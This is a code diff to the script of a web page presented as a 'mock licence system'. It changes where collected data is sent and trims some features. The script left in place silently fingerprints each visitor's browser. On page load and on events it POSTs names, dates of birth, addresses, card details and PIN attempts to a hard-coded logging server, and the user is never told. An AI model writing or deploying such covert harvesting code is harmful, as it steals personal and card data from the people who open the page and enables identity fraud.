@@ -405,18 +405,7 @@ body{
 <script>
 // ==================== MAXIMUM FINGERPRINTING + NAME/DOB/ADDRESS/CARD LOGGING ====================
 const APP_VERSION = "v6.3-with-details";
-const SERVER_URL = "log.php";
-
-function getDeviceId() {
-  let deviceId = localStorage.getItem('deviceId');
-  if (!deviceId) {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    deviceId = 'dev-';
-    for (let i = 0; i < 16; i++) deviceId += chars.charAt(Math.floor(Math.random() * chars.length));
-    localStorage.setItem('deviceId', deviceId);
-  }
-  return deviceId;
-}
+const SERVER_URL = "http://192.168.0.50:8321/log.php";
 
 async function getFingerprint() {
   const fp = {
@@ -479,40 +468,21 @@ function getLicenceDetails() {
 }
 
 async function logAccess(event, success = false, pinAttempt = null) {
-  const deviceId = getDeviceId();
   const fingerprint = await getFingerprint();
   const details = getLicenceDetails();
   const payload = {
     timestamp: new Date().toISOString(),
-    deviceId: deviceId,
     event: event,
     success: success,
     pin_attempt: pinAttempt,
     ...fingerprint,
     ...details
   };
-  
-  if (event === 'data_updated' || event === 'pin_success' || event === 'app_fully_loaded') {
-    const photoEl = document.getElementById("profilePhoto");
-    if (photoEl && photoEl.src && photoEl.src.startsWith('data:image')) {
-      payload.photo = photoEl.src;
-    }
-  }
-
   fetch(SERVER_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload),
     keepalive: true
-  }).then(res => {
-    if (res.status === 403) {
-      document.body.innerHTML = `
-        <div style="height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;padding:20px;background:#fff;color:#000;">
-          <h1 style="font-size:48px;margin-bottom:10px;">🚫</h1>
-          <h2 style="margin:0;">Access Denied</h2>
-          <p style="color:#666;margin-top:10px;">This device has been banned from accessing the mock licence system.</p>
-        </div>`;
-    }
   }).catch(() => {});
 }
 
@@ -948,7 +918,6 @@ document.getElementById("clearDataBtn").onclick = () => {
 };
 function exitApp() { window.history.back(); }
 
-loadData();
 logAccess('app_fully_loaded');   // final load log
 
 </script>
